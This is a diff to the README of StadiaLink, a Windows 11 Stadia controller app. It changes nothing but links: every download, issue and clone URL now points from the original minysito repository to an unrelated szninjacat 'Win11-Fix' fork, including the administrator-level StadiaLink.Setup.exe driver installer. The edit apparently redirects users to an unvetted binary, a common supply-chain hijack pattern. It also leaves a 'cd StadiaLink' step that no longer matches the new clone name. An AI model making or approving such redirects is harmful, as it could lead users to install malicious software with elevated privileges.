@@ -3,7 +3,7 @@
   <h1>StadiaLink</h1>
   <p><strong>Your Stadia. Your way.</strong></p>
   <p>Stadia controller configuration for Windows 11 x64 · Version 1.0.2</p>
-  <p><a href="https://github.com/minysito/StadiaLink/releases/latest"><strong>⬇ Download</strong></a> · <a href="https://github.com/minysito/StadiaLink/issues">Report an issue</a> · <a href="LICENSE">GPL-3.0</a></p>
+  <p><a href="https://github.com/szninjacat/StadiaLink-Win11-Fix/releases/tag/v1.0.2-hotfix"><strong>⬇ Download</strong></a> · <a href="https://github.com/szninjacat/StadiaLink-Win11-Fix/issues">Report an issue</a> · <a href="LICENSE">GPL-3.0</a></p>
   <p>🪟 Windows 11 x64 &nbsp; · &nbsp; 🎮 XInput &nbsp; · &nbsp; 🔗 USB + Bluetooth</p>
   <p><a href="README.es.md"><img src="app/assets/flag-es.svg" width="24" height="16" alt="ES"> Español</a> &nbsp; | &nbsp; <strong><img src="app/assets/flag-en.svg" width="24" height="16" alt="EN"> English</strong> &nbsp; | &nbsp; <a href="README.fr.md"><img src="app/assets/flag-fr.svg" width="24" height="16" alt="FR"> Français</a> &nbsp; | &nbsp; <a href="README.de.md"><img src="app/assets/flag-de.svg" width="24" height="16" alt="DE"> Deutsch</a> &nbsp; | &nbsp; <a href="README.zh-CN.md">🇨🇳 简体中文</a></p>
 </div>
@@ -24,7 +24,7 @@
 
 ## 🚀 Installation
 
-Download `StadiaLink.Setup.exe` from [Releases](https://github.com/minysito/StadiaLink/releases/latest), run it and approve the administrator prompt for driver installation. Connect your controller by USB or pair it in Windows Bluetooth settings and turn it on. StadiaLink detects the available controller.
+Download `StadiaLink.Setup.exe` from [Releases](https://github.com/szninjacat/StadiaLink-Win11-Fix/releases/tag/v1.0.2-hotfix), run it and approve the administrator prompt for driver installation. Connect your controller by USB or pair it in Windows Bluetooth settings and turn it on. StadiaLink detects the available controller.
 
 Bluetooth requires the controller's Bluetooth firmware. StadiaLink does not modify firmware. The installer includes its components and corresponding source code and works offline. It uses .NET Framework 4.8 and Windows components; no third-party controller emulator or additional runtime is required.
 
@@ -47,7 +47,7 @@ Get-FileHash .\StadiaLink.Setup.exe -Algorithm SHA256
 Open Windows PowerShell in a working folder. Building does not require administrator privileges; installing the driver does.
 
 ```powershell
-git clone https://github.com/minysito/StadiaLink.git
+git clone https://github.com/szninjacat/StadiaLink-Win11-Fix.git
 cd StadiaLink
 
 # If scripts are blocked; applies only to this session.
@@ -105,7 +105,7 @@ No firmware activation or separate utility is needed. After detecting a controll
 
 ## 💬 Issues, contributions and removal
 
-Open an [issue](https://github.com/minysito/StadiaLink/issues) with Windows version, app version, connection type and reproduction steps. Installation logs are at `%LOCALAPPDATA%\StadiaStudio\logs\driver-install.log`; remove personal information before sharing them.
+Open an [issue](https://github.com/szninjacat/StadiaLink-Win11-Fix/issues) with Windows version, app version, connection type and reproduction steps. Installation logs are at `%LOCALAPPDATA%\StadiaStudio\logs\driver-install.log`; remove personal information before sharing them.
 
 Pull requests are welcome. Describe your checks and run `tests/run.ps1` when changing configuration or input translation. Do not commit downloaded dependencies, generated binaries, personal profiles or firmware research material.
 
